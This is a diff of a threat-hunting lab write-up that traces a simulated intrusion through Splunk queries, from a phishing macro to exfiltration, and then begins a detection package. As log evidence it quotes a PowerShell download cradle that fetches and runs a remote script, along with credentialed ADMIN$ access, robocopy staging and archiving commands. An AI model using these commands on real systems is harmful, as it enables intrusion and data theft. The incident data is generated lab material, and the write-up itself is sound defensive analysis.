@@ -18,40 +18,6 @@ Brightfield Partners (`brightfield.local`), 9 hosts, 2026-08-13 → 2026-08-19. 
 | WKS05                | 10.42.20.117 | workstation           | Windows 10 22H2         |
 | WKS06                | 10.42.20.176 | workstation           | Windows 11 23H2         |
 
----
-
-## Setup splunk server & generate logs
-
-install splunk from the official splunk site https://www.splunk.com/en_us/download.html
-
-```powershell
-& "C:\Program Files\Splunk\bin\splunk.exe" restart
-& "C:\Program Files\Splunk\bin\splunk.exe" start
-& "C:\Program Files\Splunk\bin\splunk.exe" status
-& "C:\Program Files\Splunk\bin\splunk.exe" stop
-
-Get-Service *splunk*
-Start-Service Splunkd
-```
-
-**Ingest, one-shot, no restart needed:**
-
-```powershell
-$data = "C:\path\to\splunk_lab_hunt\dataset"
-& "C:\Program Files\Splunk\bin\splunk.exe" add oneshot "$data\fortigate.log"          -index hunt_lab -sourcetype fortigate
-& "C:\Program Files\Splunk\bin\splunk.exe" add oneshot "$data\sysmon.jsonl"           -index hunt_lab -sourcetype sysmon:json
-& "C:\Program Files\Splunk\bin\splunk.exe" add oneshot "$data\windows_security.jsonl" -index hunt_lab -sourcetype wineventlog:security:json
-& "C:\Program Files\Splunk\bin\splunk.exe" add oneshot "$data\windows_system.jsonl"   -index hunt_lab -sourcetype wineventlog:system:json
-& "C:\Program Files\Splunk\bin\splunk.exe" add oneshot "$data\powershell.jsonl"       -index hunt_lab -sourcetype powershell:json
-```
-
-Regenerate (this exact incident is seed `93743820`):
-
-```bash
-python generate.py --seed 93743820 --end-date 2026-08-19 --target-size 400MB
-```
-
----
 
 ## kick-start:
 
@@ -76,7 +42,7 @@ index=hunt_lab sourcetype=sysmon:json
 | sort 0 - count
 ```
 
-> 8 ComputerNames that are hosts in the local network,  Nothing unusual in terms of volume.
+8 ComputerNames that are hosts in the local network,  Nothing unusual in terms of volume.
 
 ## Add identity fields:
 
@@ -135,13 +101,13 @@ index=hunt_lab sourcetype=sysmon:json host=wks01 EventCode IN (11,13,22)
 | sort _time
 ```
 
-> **11:00:54 — macro file drop.** (EventCode 11) `OUTLOOK.EXE` writes into the attachment cache:
+**11:00:54 — macro file drop.** (EventCode 11) `OUTLOOK.EXE` writes into the attachment cache:
 
 ```
 C:\Users\yhar-even\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\812F1951\Vendor_Statement_Update.docm
 ```
 
-> A `.docm` carries embedded VBA — unlike `.docx` it can run code. `yhar-even` opened a macro doc from email.
+A `.docm` carries embedded VBA — unlike `.docx` it can run code. `yhar-even` opened a macro doc from email.
 
 > **T1566.001** — Phishing: Spearphishing Attachment
 
@@ -154,7 +120,7 @@ HKU\yhar-even\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateHelper
   → C:\Users\yhar-even\AppData\Roaming\Microsoft\Windows\WindowsUpdateHelper.exe
 ```
 
-> A Run key means it fires on every logon. Microsoft never ships core update binaries into a user's `AppData\Roaming` — real update files live in `System32` or `Windows\Servicing`. AppData is a classic malware default because it needs no admin rights.
+A Run key means it fires on every logon. Microsoft never ships core update binaries into a user's `AppData\Roaming` — real update files live in `System32` or `Windows\Servicing`. AppData is a classic malware default because it needs no admin rights.
 
 > **T1547.001** — Boot or Logon Autostart Execution: Registry Run Keys
 > **T1036.005** — Masquerading: Match Legitimate Resource Name or Location
@@ -191,7 +157,7 @@ A download cradle: pulls a remote script into memory and executes it via
 Invoke-Expression. ATT&CK names this exact construct as a T1105 procedure.
 No payload is written to disk, consistent with the absence of a file-write
 event until three hours later. The URL is truncated in the source
-telemetry; the DNS event resolves the full target.
+telemetry. the DNS event resolves the full target.
 
 > **T1059.001** (PowerShell) · **T1105** (Ingress Tool Transfer) ·
 > **T1027.010** (Command Obfuscation, *Stealth* TA0005)
@@ -203,7 +169,7 @@ telemetry; the DNS event resolves the full target.
 | `-w hidden` | WindowStyle Hidden | No visible window |
 | `-enc` | EncodedCommand | Base64 — defeats naive string matching on `DownloadString` |
 
-> Also worth noting: `IntegrityLevel: Medium` — standard user, not admin.
+Also worth noting: `IntegrityLevel: Medium` — standard user, not admin.
 
 ---
 
@@ -228,7 +194,7 @@ ProcessGuid:       {41fb6a20-6a80427b-00000002}
 User:              BRIGHTFIELD\sfriedman
 ```
 
-> I pivoted on the Excel ProcessGuid to see everything downstream: one child `cmd.exe` archiving a report locally, no network connections, no file drops outside the share, no registry writes. Chain terminates. Benign.
+I pivoted on the Excel ProcessGuid to see everything downstream: one child `cmd.exe` archiving a report locally, no network connections, no file drops outside the share, no registry writes. Chain terminates. Benign.
 
 ## 2.  same powershell event we previously found :
 
@@ -243,7 +209,7 @@ ParentProcessId:   7255
 
 ### Ruling out the false positive:
 
-> Same detection logic, opposite verdicts. One chain was macro → PowerShell → encoded download cradle → external DNS → persistence. The other was macro → cmd → local file copy → nothing. 
+Same detection logic, opposite verdicts. One chain was macro → PowerShell → encoded download cradle → external DNS → persistence. The other was macro → cmd → local file copy → nothing. 
 That's why this is a hunting query, not an alert.
 
 ---
@@ -257,12 +223,12 @@ index=hunt_lab sourcetype=fortigate
 | fieldsummary
 | table field distinct_count mean values
 ```
-> all fortigate events.
+**all fortigate events.**
 
 ```spl
 index=hunt_lab sourcetype=fortigate dstip=203.0.113.133
 ```
-> 30 events
+**30 events.**
 
 
 ```spl
@@ -273,7 +239,7 @@ index=hunt_lab sourcetype=fortigate dstip=203.0.113.133
 | table srcip count sent_mb rcvd_mb ratio first last
 ```
 
-> This query aggregates every firewall session to the 203.0.113.133 into one row per internal IP, showing how much data each one sent and received, over how many sessions, and across what time window.
+This query aggregates every firewall session to the 203.0.113.133 into one row per internal IP, showing how much data each one sent and received, over how many sessions, and across what time window.
 
 ## Two hosts, two completely different shapes:
 
@@ -289,7 +255,7 @@ index=hunt_lab sourcetype=fortigate dstip=203.0.113.133
 - **FS01 = strong exfiltration indicator .** One session, one timestamp, 58.25 MB out. A single upload of a prepared archive.
 
 
-> I ran this to check whether 203.0.113.133 ever appeared as a source, to see if the attacker had initiated any session inward:
+I ran this to check whether 203.0.113.133 ever appeared as a source, to see if the attacker had initiated any session inward:
 
 ```spl
 index=hunt_lab sourcetype=fortigate (srcip=203.0.113.133 OR dstip=203.0.113.133)
@@ -302,13 +268,12 @@ FortiGate records source and destination by session direction, so the initiator 
 An attacker-initiated connection would have shown 203.0.113.133 there. It never does- the implant dials out, and the operator's replies ride back down connections WKS01 opened. 
 Direction alone therefore tells me nothing here, which is why the sent/received ratio is what separates C2 from exfil.
 
-
-> So same destination, opposite traffic shapes — one host controlled, the other emptied. lets confirm on the endpoint side:
+same destination, opposite traffic shapes  one host controlled, the other emptied. lets confirm on the endpoint side:
 
 ```spl
 index=hunt_lab sourcetype=sysmon:json host=fs01 EventCode=3 DestinationIp=203.0.113.133
 ```
-> One network event on FS01, at    UtcTime: 2026-08-17 12:02:01.000 . Consistent.
+One network event on FS01, at    UtcTime: 2026-08-17 12:02:01.000 . Consistent.
 
 **summary so far:**
 Splitting the traffic towards "203.0.113.133" returned two internal hosts, and only one of them had a delivery story. WKS01 had the attachment, the cradle, and three hours of beaconing. 
@@ -320,12 +285,12 @@ The rare admin account adm-mrogers — 2 events out of 131K+ events in Sysmon, b
 
 ## Stage 3.1 — What logon reached FS01?.
 
-***Searching for all windows security logs EventID's to surface any logons/authentication and process-creation audit on FS01 : ***
+***Searching for all windows security logs EventID's to surface any logons/authentication and process-creation audit on FS01 :***
 
 ```spl
 index=hunt_lab sourcetype=wineventlog:security:json ComputerName="FS01*" 
 ```
-> 10 events:
+**10 events:**
 
 4688	3	30%	
 4624	2	20%	
@@ -368,8 +333,8 @@ index=hunt_lab sourcetype=wineventlog:security:json ComputerName="WKS01*" EventC
 | table _time SubjectUserName TargetUserName TargetServerName ProcessName LogonGuid
 | sort _time
 ```
-_time	                  SubjectUserName	      TargetUserName	TargetServerName	ProcessName	
-2026-08-17 14:47:34	BRIGHTFIELD\yhar-even	adm-mrogers	      FS01	            net.exe
+_time	                 |      SubjectUserName	       |     TargetUserName |	TargetServerName	| ProcessName	
+2026-08-17 14:47:34	   |       BRIGHTFIELD\yhar-even	|     adm-mrogers	  |      FS01	         |   net.exe
 
 
 ### 22 seconds later, FS01 accepts it:
@@ -382,12 +347,12 @@ _time	                  SubjectUserName	      TargetUserName	TargetServerName	Pr
 
             | WKS01-4648	    |WKS01-Sysmon EventID 1
 Time	      | 14:47:34	          |14:47:34
-Process	| net.exe	          |net.exe
-Target	| FS01	          | \\FS01\ADMIN$
-Account	| adm-mrogers	    | /user:BRIGHTFIELD\adm-mrogers
+Process	    | net.exe	            |net.exe
+Target	    | FS01	              | \\FS01\ADMIN$
+Account	    | adm-mrogers	        | /user:BRIGHTFIELD\adm-mrogers
 
 
->we had a logon on FS01 and a compromised session on WKS01, with nothing linking them but a source IP and a timestamp. Rather than guess at a mechanism, I went back to the pivot that had carried the investigation so far - PowerShell {fc14a32e-6a82c004-00000005}, alive since 11:02:12 — and pulled everything it did or spawned. If the operator moved laterally, they moved from somewhere, and that session was the only thing on WKS01 under their control.
+we had a logon on FS01 and a compromised session on WKS01, with nothing linking them but a source IP and a timestamp. Rather than guess at a mechanism, I went back to the pivot that had carried the investigation so far - PowerShell {fc14a32e-6a82c004-00000005}, alive since 11:02:12 — and pulled everything it did or spawned. If the operator moved laterally, they moved from somewhere, and that session was the only thing on WKS01 under their control.
 
 ```spl
 index=hunt_lab sourcetype=sysmon:json
@@ -412,19 +377,19 @@ Beaconing runs to 14:14:45 - eleven connections to 203.0.113.133 at 6–8 minute
 
 ###### Host, then domain, then a single named server, then a process check — widening and then narrowing, with irregular one-to-four-minute gaps between commands. That cadence is a person reading output and deciding what to run next, not a script executing a list. It also answers a question I had been treating as settled: FS01 wasn't chosen from the C2 side, it was chosen here. net user /domain and nltest /dclist mapped the domain, and net.exe view \\FS01 at 14:36:24 enumerated that specific file server's shares eleven minutes before anything authenticated to it.
 
->Then, at 14:47:34, the last event in the session:
+**Then, at 14:47:34, the last event in the session:**
 
 ```
 net.exe use \\FS01\ADMIN$ /user:BRIGHTFIELD\adm-mrogers *
 ```
 
->Twenty-two seconds before FS01's 4624 - mapping the share the 5140 recorded, under the account the logon carried, from the process that had been beaconing for three hours. The chain closes on itself.
+Twenty-two seconds before FS01's 4624 - mapping the share the 5140 recorded, under the account the logon carried, from the process that had been beaconing for three hours. The chain closes on itself.
 
->Two details worth flagging. Every command in this session runs at IntegrityLevel: Medium as yhar-even: the operator never elevated on WKS01 at all, which is why a stolen domain credential was the path forward rather than local escalation. And the 8m52s between 'tasklist /v' and 'net.exe' use is the longest silence in the session and the only interval with no telemetry.
+Two details worth flagging. Every command in this session runs at IntegrityLevel: Medium as yhar-even: the operator never elevated on WKS01 at all, which is why a stolen domain credential was the path forward rather than local escalation. And the 8m52s between 'tasklist /v' and 'net.exe' use is the longest silence in the session and the only interval with no telemetry.
 
-> whatever produced adm-mrogers's credential happened there, and it left nothing in Sysmon. That narrows my unresolved credential-access gap from a three-hour window to nine minutes.
+whatever produced adm-mrogers's credential happened there, and it left nothing in Sysmon. That narrows my unresolved credential-access gap from a three-hour window to nine minutes.
 
-***T1082 System Information Discovery · T1087.002 Domain Account Discovery · T1018 Remote System Discovery · T1057 Process Discovery***
+***T1082 System Information Discovery - T1087.002 Domain Account Discovery - T1018 Remote System Discovery - T1057 Process Discovery***
 
 
 3.3 Everything WKS01 logged in the window, no sourcetype filter
@@ -451,8 +416,8 @@ wineventlog:security:json |	4688      |    12     |
 wineventlog:security:json |	4648	    |    1      |
 wineventlog:system:json	  |    7036	    |   800     |
 
->powershell:json eventcode: 4104 is my first place to look. 
->so i zoom out to run a wide search to avoid "tunnel-visioning" at a short time frame:
+****powershell:json eventcode: 4104 is my first place to look.****
+so i zoom out to run a wide search to avoid "tunnel-visioning" at a short time frame:
 
 ```spl
 index=hunt_lab sourcetype=powershell:json host=wks01 EventCode=4104
@@ -461,19 +426,19 @@ earliest="08/17/2026:10:00:00" latest="08/17/2026:14:48:00"
 | convert ctime(first) ctime(last)
 | sort first
 ```
->Six commands on repeat - Get-EventLog System, Get-ADUser | Export-Csv, Copy-Item template.xlsx, Restart-Service Spooler, Get-Service, Get-ChildItem C:\Shares\Finance — identical arguments, no progression. As a cluster they map to four Discovery sub-techniques, so I aggregated by command text across 10:00 → 14:48 instead of reading chronologically: frequency is what separates a loop from a person. Each returns 89–112 executions, all running by 10:06 — an hour before the attachment opened. Scheduled automation.
+>Six commands on repeat - Get-EventLog System, Get-ADUser | Export-Csv, Copy-Item template.xlsx, Restart-Service Spooler, Get-Service, Get-ChildItem C:\Shares\Finance - identical arguments, no progression. As a cluster they map to four Discovery sub-techniques, so I aggregated by command text across 10:00 -> 14:48 instead of reading chronologically: frequency is what separates a loop from a person. Each returns 89–112 executions, all running by 10:06 - an hour before the attachment opened. Scheduled automation.
 
 **Exactly one block is unique:**
 ```
 11:02:12  IEX (New-Object Net.WebClient).DownloadString('https://static-assets-cache.net/update.'); Start-Sleep -Seconds 2
 ```
 
-***Count of 1. The decoded -enc payload executing, with the full URL Sysmon's CommandLine had truncated. The trailing Start-Sleep is the beacon primitive. No other powershell events — the second stage came down through this cradle and ran in memory.***
+***Count of 1. The decoded -enc payload executing, with the full URL Sysmon's CommandLine had truncated. The trailing Start-Sleep is the beacon primitive. No other powershell events - the second stage came down through this cradle and ran in memory.***
 
 
 ### 3.4   Correlating the chain from Security audit
 
->Sysmon gave me the operator session through ProcessGuid. Windows process-creation auditing records the same activity independently, so I pulled 4688 across the full session — if the two sources disagree, one of them is wrong and I need to know before I write anything up.
+Sysmon gave me the operator session through ProcessGuid. Windows process-creation auditing records the same activity independently, so I pulled 4688 across the full session — if the two sources disagree, one of them is wrong and I need to know before I write anything up.
 
 ```spl
 index=hunt_lab sourcetype=wineventlog:security:json host=wks01 EventCode=4688
@@ -520,7 +485,7 @@ index=hunt_lab sourcetype=wineventlog:security:json TargetUserName="adm-mrogers"
 
 ---
 
-## Stage 4 — Remote execution via service install
+## Stage 4 - Remote execution via service install
 
 ```spl
 index=hunt_lab sourcetype=wineventlog:system:json ComputerName="FS01*" EventCode=7045
@@ -535,16 +500,16 @@ earliest="08/17/2026:14:45:00" latest="08/17/2026:15:00:00"
           AccountName: adm-mrogers
 ```
 
-| Field                                | Why it's an indicator                                    |
-|         ---                 ---      |         ---                                ---            |
-| `WindowsUpdateSvc`                   | masquerades as the real `wuauserv`                         |
-| `C:\Windows\Temp\wuhelper.exe`       |legitimate ones live in System32 or Program Files not Temp   |
-| `demand start`                       | not auto-start - triggered once, then discarded              |
-| `adm-mrogers`                    | the compromised account, 11 seconds after the ADMIN$ share access |
+| Field                                | Why it's an indicator                                       |
+|         ---                 ---      |         ---                                ---               |
+| `WindowsUpdateSvc`                   | masquerades as the real `wuauserv`                            |
+| `C:\Windows\Temp\wuhelper.exe`       |legitimate ones live in System32 or Program Files not Temp      |
+| `demand start`                       | not auto-start - triggered once, then discarded                 |
+| `adm-mrogers`                        | the compromised account, 11 seconds after the ADMIN$ share access |
 
-> **T1543.003** — Create or Modify System Process: Windows Service · **T1569.002** — System Services: Service Execution · **T1036.004** — Masquerade Task or Service
+> **T1543.003** - Create or Modify System Process: Windows Service · **T1569.002** - System Services: Service Execution · **T1036.004** - Masquerade Task or Service
 
-**Baseline contrast — the only other 7045 in seven days is `AdobeARMservice` on WKS04, `LocalSystem`, auto-start, path under Program Files. Same event code, opposite everything.**
+**Baseline contrast - the only other 7045 in seven days is `AdobeARMservice` on WKS04, `LocalSystem`, auto-start, path under Program Files. Same event code, opposite everything.**
 
 **Same second (14:48:07), the service's first command runs:**
 
@@ -558,9 +523,9 @@ cmd.exe /c whoami && net localgroup administrators
 ParentProcessName: services.exe
 ```
 
-`services.exe` as the parent — launched by the Service Control Manager, not an interactive session. Confirms identity and local admin membership before doing anything else.
+`services.exe` as the parent - launched by the Service Control Manager, not an interactive session. Confirms identity and local admin membership before doing anything else.
 
-> **T1033** — System Owner/User Discovery · **T1069.001** — Permission Groups Discovery: Local Groups
+> **T1033** - System Owner/User Discovery · **T1069.001** - Permission Groups Discovery: Local Groups
 
 ---
 
@@ -581,7 +546,7 @@ robocopy.exe \\FS01\Finance$ C:\Windows\Temp\svc_stage /E /NFL
 
 `Finance$` is the hidden administrative share — exactly why the ADMIN$ logon five minutes earlier mattered. `/E` recurses everything including empty folders; `/NFL` suppresses Robocopy's own per-file log, cutting down local forensic residue. Signed native binary, no tooling introduced.
 
-> **T1005** — Data from Local System · **T1039** — Data from Network Shared Drive
+> **T1005** - Data from Local System · **T1039** - Data from Network Shared Drive
 
 **14:52:08 → 14:55:24 — 14 files staged** into `C:\Windows\Temp\svc_stage\`:
 
@@ -604,7 +569,7 @@ powershell.exe -nop -c "Compress-Archive -Path C:\Windows\Temp\svc_stage -Destin
 
 Archive written 14:57:51. `-nop` matches the flag habit from the WKS01 launch — same operator. `sys_diag.zip` follows the same naming trick as `WindowsUpdateHelper.exe` and `wuhelper.exe`: everything dressed up as system maintenance.
 
-> **T1560.001** — Archive Collected Data via Utility · **T1036** — Masquerading
+> **T1560.001** - Archive Collected Data via Utility · **T1036** - Masquerading
 
 **15:02:01 — exfiltration.**
 
@@ -615,7 +580,7 @@ index=hunt_lab sourcetype=sysmon:json host=fs01 EventCode=3 DestinationIp=203.0.
 
 `powershell.exe`, PID 33742, `{f6196639-6a82f737-00000006}` → 203.0.113.133:443. FortiGate side of the same session: **61,077,316 bytes sent / 2,596 received — one session, ~58 MB, ratio over 23,000:1**, port 443 blending in with ordinary HTTPS.
 
-> **T1041** — Exfiltration Over C2 Channel
+> **T1041** - Exfiltration Over C2 Channel
 
 15:03:01 — 4647/4634 logoff, session closed.
 
@@ -654,7 +619,7 @@ index=hunt_lab sourcetype=sysmon:json host=fs01 EventCode=3 DestinationIp=203.0.
 
 ## Detection package
 
-### Alert 1 — Office application spawns a script interpreter
+### Alert 1 - Office application spawns a script interpreter
 
 Office spawning an interpreter isn't malicious by itself.
 
